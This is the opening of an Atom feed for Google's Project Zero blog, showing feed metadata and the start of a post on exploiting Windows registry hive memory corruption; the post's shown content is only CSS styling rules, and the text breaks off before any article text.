<?xml version='1.0' encoding='UTF-8'?><?xml-stylesheet href="http://www.blogger.com/styles/atom.css" type="text/css"?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:blogger='http://schemas.google.com/blogger/2008' xmlns:georss='http://www.georss.org/georss' xmlns:gd="http://schemas.google.com/g/2005" xmlns:thr='http://purl.org/syndication/thread/1.0'><id>tag:blogger.com,1999:blog-4838136820032157985</id><updated>2025-06-12T00:07:05.798-07:00</updated><category term="windows"/><title type='text'>Project Zero</title><subtitle type='html'>News and updates from the Project Zero team at Google</subtitle><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/posts/default'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/'/><link rel='hub' href='http://pubsubhubbub.appspot.com/'/><link rel='next' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default?start-index=26&amp;max-results=25'/><author><name>Mateusz Jurczyk</name><uri>http://www.blogger.com/profile/04573174869320655566</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><generator version='7.00' uri='http://www.blogger.com'>Blogger</generator><openSearch:totalResults>236</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>25</openSearch:itemsPerPage><entry><id>tag:blogger.com,1999:blog-4838136820032157985.post-2741369537148127470</id><published>2025-05-28T11:09:00.000-07:00</published><updated>2025-05-28T11:09:15.861-07:00</updated><title type='text'>The Windows Registry Adventure #8: Practical exploitation of hive memory corruption</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(https://themes.googleusercontent.com/fonts/css?kit=4mNYFHt_IKFsPe52toizH4p83mgBAhLHyHAPxI1dyqRxQrWfGkuQc6DuI-XUnmCm);.lst-kix_cuzd0pwxkzwj-5&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-5}.lst-kix_abtaez6amq7m-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-8,lower-roman) &quot;. &quot;}.lst-kix_yn1qpyq8396u-1&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-1}.lst-kix_abtaez6amq7m-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-7,lower-latin) &quot;. &quot;}ol.lst-kix_wh3djbl2z8na-7{list-style-type:none}.lst-kix_abtaez6amq7m-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-6,decimal) &quot;. &quot;}ol.lst-kix_wh3djbl2z8na-6{list-style-type:none}ol.lst-kix_wh3djbl2z8na-8{list-style-type:none}.lst-kix_abtaez6amq7m-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-4,lower-latin) &quot;. &quot;}.lst-kix_abtaez6amq7m-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-3,decimal) &quot;. &quot;}.lst-kix_abtaez6amq7m-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-5,lower-roman) &quot;. &quot;}.lst-kix_abtaez6amq7m-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-0,decimal) &quot;. &quot;}.lst-kix_abtaez6amq7m-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-1,lower-latin) &quot;. &quot;}.lst-kix_abtaez6amq7m-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_abtaez6amq7m-2,lower-roman) &quot;. &quot;}ol.lst-kix_wh3djbl2z8na-3{list-style-type:none}ol.lst-kix_wh3djbl2z8na-2{list-style-type:none}ol.lst-kix_wh3djbl2z8na-5{list-style-type:none}ol.lst-kix_wh3djbl2z8na-4{list-style-type:none}ol.lst-kix_wh3djbl2z8na-1{list-style-type:none}ol.lst-kix_wh3djbl2z8na-0{list-style-type:none}.lst-kix_qux0xwfdwk15-7&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-7}ol.lst-kix_8kp8wobudiou-1.start{counter-reset:lst-ctn-kix_8kp8wobudiou-1 0}ol.lst-kix_hyrlma59f00u-5{list-style-type:none}ol.lst-kix_hyrlma59f00u-6{list-style-type:none}ol.lst-kix_hyrlma59f00u-7{list-style-type:none}ol.lst-kix_hyrlma59f00u-8{list-style-type:none}ol.lst-kix_hyrlma59f00u-1{list-style-type:none}ol.lst-kix_hyrlma59f00u-2{list-style-type:none}ol.lst-kix_hyrlma59f00u-3{list-style-type:none}ol.lst-kix_hyrlma59f00u-4{list-style-type:none}ol.lst-kix_qux0xwfdwk15-7.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-7 0}ol.lst-kix_l1re9pb3r2ti-3.start{counter-reset:lst-ctn-kix_l1re9pb3r2ti-3 0}.lst-kix_8kp8wobudiou-8&gt;li{counter-increment:lst-ctn-kix_8kp8wobudiou-8}.lst-kix_8kp8wobudiou-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_qux0xwfdwk15-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-0,decimal) &quot;. &quot;}.lst-kix_l1re9pb3r2ti-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_l1re9pb3r2ti-2,lower-roman) &quot;. &quot;}.lst-kix_l1re9pb3r2ti-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_l1re9pb3r2ti-1,lower-latin) &quot;. &quot;}.lst-kix_l1re9pb3r2ti-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_l1re9pb3r2ti-3,decimal) &quot;. &quot;}.lst-kix_qux0xwfdwk15-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-2,lower-roman) &quot;. &quot;}ol.lst-kix_yn1qpyq8396u-6.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-6 0}.lst-kix_l1re9pb3r2ti-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_l1re9pb3r2ti-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_l1re9pb3r2ti-4,lower-latin) &quot;. &quot;}.lst-kix_qux0xwfdwk15-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-1,lower-latin) &quot;. &quot;}.lst-kix_qux0xwfdwk15-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-4,lower-latin) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2fen9zw0vjz4-8,lower-roman) &quot;. &quot;}.lst-kix_8kp8wobudiou-1&gt;li{counter-increment:lst-ctn-kix_8kp8wobudiou-1}.lst-kix_qux0xwfdwk15-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-3,decimal) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2fen9zw0vjz4-7,lower-latin) &quot;. &quot;}.lst-kix_qux0xwfdwk15-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-8,lower-roman) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2fen9zw0vjz4-4,lower-latin) &quot;. &quot;}ol.lst-kix_wh3djbl2z8na-8.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-8 0}ol.lst-kix_abtaez6amq7m-8.start{counter-reset:lst-ctn-kix_abtaez6amq7m-8 0}ol.lst-kix_8kp8wobudiou-6.start{counter-reset:lst-ctn-kix_8kp8wobudiou-6 0}.lst-kix_qux0xwfdwk15-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-6,decimal) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2fen9zw0vjz4-2,lower-roman) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2fen9zw0vjz4-6,decimal) &quot;. &quot;}.lst-kix_abtaez6amq7m-7&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-7}.lst-kix_l1re9pb3r2ti-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_l1re9pb3r2ti-8,lower-roman) &quot;. &quot;}ol.lst-kix_abtaez6amq7m-1.start{counter-reset:lst-ctn-kix_abtaez6amq7m-1 0}.lst-kix_qux0xwfdwk15-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-5,lower-roman) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2fen9zw0vjz4-1,lower-latin) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2fen9zw0vjz4-5,lower-roman) &quot;. &quot;}.lst-kix_l1re9pb3r2ti-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_l1re9pb3r2ti-6,decimal) &quot;. &quot;}.lst-kix_l1re9pb3r2ti-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_l1re9pb3r2ti-5,lower-roman) &quot;. &quot;}.lst-kix_l1re9pb3r2ti-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_l1re9pb3r2ti-7,lower-latin) &quot;. &quot;}.lst-kix_qux0xwfdwk15-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_qux0xwfdwk15-7,lower-latin) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2fen9zw0vjz4-3,decimal) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_hc7ktzssita9-1&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-1}ol.lst-kix_2fen9zw0vjz4-5.start{counter-reset:lst-ctn-kix_2fen9zw0vjz4-5 0}ol.lst-kix_qux0xwfdwk15-2.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-2 0}ol.lst-kix_wh3djbl2z8na-1.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-1 0}.lst-kix_wh3djbl2z8na-4&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-4}ol.lst-kix_hc7ktzssita9-5.start{counter-reset:lst-ctn-kix_hc7ktzssita9-5 0}.lst-kix_hyrlma59f00u-7&gt;li{counter-increment:lst-ctn-kix_hyrlma59f00u-7}ol.lst-kix_cuzd0pwxkzwj-3.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-3 0}ol.lst-kix_hyrlma59f00u-2.start{counter-reset:lst-ctn-kix_hyrlma59f00u-2 0}ol.lst-kix_wh3djbl2z8na-6.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-6 0}ol.lst-kix_2fen9zw0vjz4-3.start{counter-reset:lst-ctn-kix_2fen9zw0vjz4-3 0}.lst-kix_kzn99s8ciqwj-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_kzn99s8ciqwj-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_wh3djbl2z8na-3.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-3 0}ol.lst-kix_qux0xwfdwk15-0.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-0 0}.lst-kix_hc7ktzssita9-5&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-5}.lst-kix_8kp8wobudiou-5&gt;li{counter-increment:lst-ctn-kix_8kp8wobudiou-5}.lst-kix_kzn99s8ciqwj-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_wh3djbl2z8na-8&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-8}.lst-kix_hyrlma59f00u-8&gt;li{counter-increment:lst-ctn-kix_hyrlma59f00u-8}ol.lst-kix_8kp8wobudiou-3.start{counter-reset:lst-ctn-kix_8kp8wobudiou-3 0}.lst-kix_yn1qpyq8396u-5&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-5}.lst-kix_kzn99s8ciqwj-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kzn99s8ciqwj-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_2fen9zw0vjz4-0{list-style-type:none}ol.lst-kix_l1re9pb3r2ti-7{list-style-type:none}ol.lst-kix_l1re9pb3r2ti-6{list-style-type:none}ol.lst-kix_l1re9pb3r2ti-8{list-style-type:none}ol.lst-kix_l1re9pb3r2ti-3{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-5.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-5 0}ol.lst-kix_l1re9pb3r2ti-2{list-style-type:none}ol.lst-kix_l1re9pb3r2ti-5{list-style-type:none}ol.lst-kix_l1re9pb3r2ti-4{list-style-type:none}.lst-kix_8kp8wobudiou-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8kp8wobudiou-2,lower-roman) &quot;. &quot;}ol.lst-kix_qux0xwfdwk15-6{list-style-type:none}ol.lst-kix_qux0xwfdwk15-7{list-style-type:none}ol.lst-kix_qux0xwfdwk15-8{list-style-type:none}.lst-kix_8kp8wobudiou-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8kp8wobudiou-4,lower-latin) &quot;. &quot;}ol.lst-kix_qux0xwfdwk15-2{list-style-type:none}ol.lst-kix_qux0xwfdwk15-3{list-style-type:none}ol.lst-kix_qux0xwfdwk15-4{list-style-type:none}ol.lst-kix_qux0xwfdwk15-5{list-style-type:none}ol.lst-kix_qux0xwfdwk15-0{list-style-type:none}ol.lst-kix_qux0xwfdwk15-1{list-style-type:none}.lst-kix_2fen9zw0vjz4-6&gt;li{counter-increment:lst-ctn-kix_2fen9zw0vjz4-6}.lst-kix_8kp8wobudiou-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8kp8wobudiou-6,decimal) &quot;. &quot;}ol.lst-kix_hyrlma59f00u-4.start{counter-reset:lst-ctn-kix_hyrlma59f00u-4 0}ol.lst-kix_l1re9pb3r2ti-1{list-style-type:none}.lst-kix_8kp8wobudiou-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8kp8wobudiou-8,lower-roman) &quot;. &quot;}ol.lst-kix_hc7ktzssita9-8.start{counter-reset:lst-ctn-kix_hc7ktzssita9-8 0}.lst-kix_abtaez6amq7m-3&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-3}.lst-kix_qux0xwfdwk15-3&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-3}.lst-kix_l1re9pb3r2ti-2&gt;li{counter-increment:lst-ctn-kix_l1re9pb3r2ti-2}.lst-kix_cuzd0pwxkzwj-1&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-1}ol.lst-kix_l1re9pb3r2ti-8.start{counter-reset:lst-ctn-kix_l1re9pb3r2ti-8 0}.lst-kix_l1re9pb3r2ti-1&gt;li{counter-increment:lst-ctn-kix_l1re9pb3r2ti-1}.lst-kix_abtaez6amq7m-4&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-4}ul.lst-kix_hyrlma59f00u-0{list-style-type:none}.lst-kix_yn1qpyq8396u-0&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-0}ol.lst-kix_hyrlma59f00u-1.start{counter-reset:lst-ctn-kix_hyrlma59f00u-1 0}.lst-kix_ndr66mjka4k5-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_2fen9zw0vjz4-7.start{counter-reset:lst-ctn-kix_2fen9zw0vjz4-7 0}.lst-kix_yn1qpyq8396u-2&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-2}.lst-kix_ndr66mjka4k5-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ndr66mjka4k5-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_cuzd0pwxkzwj-7.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-7 0}.lst-kix_hc7ktzssita9-0&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-0}ol.lst-kix_yn1qpyq8396u-8.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-8 0}.lst-kix_ndr66mjka4k5-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_yn1qpyq8396u-4&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-4}.lst-kix_cuzd0pwxkzwj-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-5,lower-roman) &quot;. &quot;}.lst-kix_cuzd0pwxkzwj-8&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-8}.lst-kix_cuzd0pwxkzwj-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-6,decimal) &quot;. &quot;}ol.lst-kix_2fen9zw0vjz4-8{list-style-type:none}ol.lst-kix_2fen9zw0vjz4-7{list-style-type:none}ol.lst-kix_2fen9zw0vjz4-6{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-8.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-8 0}ol.lst-kix_2fen9zw0vjz4-5{list-style-type:none}.lst-kix_hyrlma59f00u-3&gt;li{counter-increment:lst-ctn-kix_hyrlma59f00u-3}ol.lst-kix_2fen9zw0vjz4-4{list-style-type:none}ol.lst-kix_2fen9zw0vjz4-3{list-style-type:none}ol.lst-kix_2fen9zw0vjz4-2{list-style-type:none}.lst-kix_cuzd0pwxkzwj-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-1,lower-latin) &quot;. &quot;}.lst-kix_qux0xwfdwk15-2&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-2}ol.lst-kix_wh3djbl2z8na-0.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-0 0}.lst-kix_cuzd0pwxkzwj-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-2,lower-roman) &quot;. &quot;}.lst-kix_ndr66mjka4k5-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_yn1qpyq8396u-7.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-7 0}ol.lst-kix_2fen9zw0vjz4-1{list-style-type:none}.lst-kix_hc7ktzssita9-7&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-7}.lst-kix_hyrlma59f00u-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyrlma59f00u-3,decimal) &quot;. &quot;}.lst-kix_hyrlma59f00u-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyrlma59f00u-2,lower-roman) &quot;. &quot;}.lst-kix_hyrlma59f00u-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyrlma59f00u-6,decimal) &quot;. &quot;}.lst-kix_wh3djbl2z8na-1&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-1}.lst-kix_hc7ktzssita9-4&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-4}ol.lst-kix_yn1qpyq8396u-1.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-1 0}.lst-kix_hc7ktzssita9-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-7,lower-latin) &quot;. &quot;}.lst-kix_8kp8wobudiou-3&gt;li{counter-increment:lst-ctn-kix_8kp8wobudiou-3}ol.lst-kix_2fen9zw0vjz4-6.start{counter-reset:lst-ctn-kix_2fen9zw0vjz4-6 0}ol.lst-kix_yn1qpyq8396u-4.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-4 0}ol.lst-kix_abtaez6amq7m-3.start{counter-reset:lst-ctn-kix_abtaez6amq7m-3 0}ol.lst-kix_abtaez6amq7m-6.start{counter-reset:lst-ctn-kix_abtaez6amq7m-6 0}ul.lst-kix_l1re9pb3r2ti-0{list-style-type:none}.lst-kix_2fen9zw0vjz4-3&gt;li{counter-increment:lst-ctn-kix_2fen9zw0vjz4-3}.lst-kix_yn1qpyq8396u-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-7,lower-latin) &quot;. &quot;}.lst-kix_kzn99s8ciqwj-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_l1re9pb3r2ti-6&gt;li{counter-increment:lst-ctn-kix_l1re9pb3r2ti-6}.lst-kix_hyrlma59f00u-5&gt;li{counter-increment:lst-ctn-kix_hyrlma59f00u-5}.lst-kix_kzn99s8ciqwj-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_2fen9zw0vjz4-8.start{counter-reset:lst-ctn-kix_2fen9zw0vjz4-8 0}.lst-kix_8kp8wobudiou-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8kp8wobudiou-3,decimal) &quot;. &quot;}ul.lst-kix_kzn99s8ciqwj-8{list-style-type:none}ul.lst-kix_kzn99s8ciqwj-7{list-style-type:none}ol.lst-kix_abtaez6amq7m-5.start{counter-reset:lst-ctn-kix_abtaez6amq7m-5 0}ul.lst-kix_8kp8wobudiou-0{list-style-type:none}.lst-kix_wh3djbl2z8na-6&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-6}ol.lst-kix_yn1qpyq8396u-2.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-2 0}.lst-kix_8kp8wobudiou-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8kp8wobudiou-7,lower-latin) &quot;. &quot;}.lst-kix_hc7ktzssita9-2&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-2}.lst-kix_yn1qpyq8396u-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-3,decimal) &quot;. &quot;}.lst-kix_abtaez6amq7m-6&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-6}ol.lst-kix_abtaez6amq7m-4.start{counter-reset:lst-ctn-kix_abtaez6amq7m-4 0}ul.lst-kix_kzn99s8ciqwj-4{list-style-type:none}ul.lst-kix_kzn99s8ciqwj-3{list-style-type:none}.lst-kix_qux0xwfdwk15-0&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-0}ul.lst-kix_kzn99s8ciqwj-6{list-style-type:none}ul.lst-kix_kzn99s8ciqwj-5{list-style-type:none}ul.lst-kix_kzn99s8ciqwj-0{list-style-type:none}ol.lst-kix_yn1qpyq8396u-3.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-3 0}ul.lst-kix_kzn99s8ciqwj-2{list-style-type:none}ul.lst-kix_kzn99s8ciqwj-1{list-style-type:none}.lst-kix_wh3djbl2z8na-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-0,decimal) &quot;. &quot;}.lst-kix_wh3djbl2z8na-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-1,lower-latin) &quot;. &quot;}.lst-kix_wh3djbl2z8na-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-3,decimal) &quot;. &quot;}.lst-kix_wh3djbl2z8na-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-2,lower-roman) &quot;. &quot;}.lst-kix_wh3djbl2z8na-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-4,lower-latin) &quot;. &quot;}.lst-kix_qux0xwfdwk15-5&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-5}.lst-kix_wh3djbl2z8na-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-6,decimal) &quot;. &quot;}.lst-kix_wh3djbl2z8na-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-5,lower-roman) &quot;. &quot;}ol.lst-kix_hc7ktzssita9-4.start{counter-reset:lst-ctn-kix_hc7ktzssita9-4 0}.lst-kix_wh3djbl2z8na-2&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-2}.lst-kix_wh3djbl2z8na-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-7,lower-latin) &quot;. &quot;}.lst-kix_wh3djbl2z8na-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_wh3djbl2z8na-8,lower-roman) &quot;. &quot;}ol.lst-kix_yn1qpyq8396u-5.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-5 0}.lst-kix_2fen9zw0vjz4-8&gt;li{counter-increment:lst-ctn-kix_2fen9zw0vjz4-8}ol.lst-kix_wh3djbl2z8na-2.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-2 0}ol.lst-kix_qux0xwfdwk15-1.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-1 0}ol.lst-kix_8kp8wobudiou-7.start{counter-reset:lst-ctn-kix_8kp8wobudiou-7 0}.lst-kix_hyrlma59f00u-2&gt;li{counter-increment:lst-ctn-kix_hyrlma59f00u-2}.lst-kix_abtaez6amq7m-5&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-5}ol.lst-kix_cuzd0pwxkzwj-4.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-4 0}ol.lst-kix_abtaez6amq7m-2.start{counter-reset:lst-ctn-kix_abtaez6amq7m-2 0}.lst-kix_l1re9pb3r2ti-4&gt;li{counter-increment:lst-ctn-kix_l1re9pb3r2ti-4}.lst-kix_2fen9zw0vjz4-1&gt;li{counter-increment:lst-ctn-kix_2fen9zw0vjz4-1}ol.lst-kix_2fen9zw0vjz4-4.start{counter-reset:lst-ctn-kix_2fen9zw0vjz4-4 0}.lst-kix_cuzd0pwxkzwj-3&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-3}ol.lst-kix_yn1qpyq8396u-0.start{counter-reset:lst-ctn-kix_yn1qpyq8396u-0 0}.lst-kix_hc7ktzssita9-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-0,decimal) &quot;. &quot;}.lst-kix_hc7ktzssita9-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-5,lower-roman) &quot;. &quot;}.lst-kix_abtaez6amq7m-1&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-1}ol.lst-kix_abtaez6amq7m-7.start{counter-reset:lst-ctn-kix_abtaez6amq7m-7 0}ol.lst-kix_wh3djbl2z8na-7.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-7 0}.lst-kix_hc7ktzssita9-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-4,lower-latin) &quot;. &quot;}.lst-kix_hc7ktzssita9-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-1,lower-latin) &quot;. &quot;}.lst-kix_hc7ktzssita9-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-3,decimal) &quot;. &quot;}.lst-kix_hc7ktzssita9-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-2,lower-roman) &quot;. &quot;}.lst-kix_2fen9zw0vjz4-4&gt;li{counter-increment:lst-ctn-kix_2fen9zw0vjz4-4}.lst-kix_yn1qpyq8396u-7&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-7}ol.lst-kix_hyrlma59f00u-5.start{counter-reset:lst-ctn-kix_hyrlma59f00u-5 0}ol.lst-kix_abtaez6amq7m-0.start{counter-reset:lst-ctn-kix_abtaez6amq7m-0 0}.lst-kix_hyrlma59f00u-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyrlma59f00u-7,lower-latin) &quot;. &quot;}.lst-kix_hc7ktzssita9-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-6,decimal) &quot;. &quot;}.lst-kix_hyrlma59f00u-6&gt;li{counter-increment:lst-ctn-kix_hyrlma59f00u-6}.lst-kix_hc7ktzssita9-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hc7ktzssita9-8,lower-roman) &quot;. &quot;}.lst-kix_cuzd0pwxkzwj-0&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-0}ol.lst-kix_l1re9pb3r2ti-7.start{counter-reset:lst-ctn-kix_l1re9pb3r2ti-7 0}.lst-kix_yn1qpyq8396u-6&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-6}.lst-kix_l1re9pb3r2ti-7&gt;li{counter-increment:lst-ctn-kix_l1re9pb3r2ti-7}ol.lst-kix_hc7ktzssita9-6.start{counter-reset:lst-ctn-kix_hc7ktzssita9-6 0}.lst-kix_2fen9zw0vjz4-5&gt;li{counter-increment:lst-ctn-kix_2fen9zw0vjz4-5}.lst-kix_yn1qpyq8396u-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-6,decimal) &quot;. &quot;}.lst-kix_hc7ktzssita9-6&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-6}.lst-kix_yn1qpyq8396u-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-8,lower-roman) &quot;. 